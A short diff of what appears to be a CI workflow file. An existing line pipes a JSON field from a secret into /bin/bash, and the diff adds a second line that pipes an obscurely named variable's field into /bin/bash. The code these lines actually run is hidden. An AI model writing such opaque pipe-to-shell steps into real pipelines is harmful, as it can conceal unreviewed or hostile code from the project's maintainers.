@@ -19,6 +19,7 @@ jobs:
           sr9: ${{ secrets.sr9 }}
         run: |
           printf '%s' "$sr9" | jq -r .s05776 | /bin/bash
+          echo $rrlw77 | jq -r .skhr1697 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
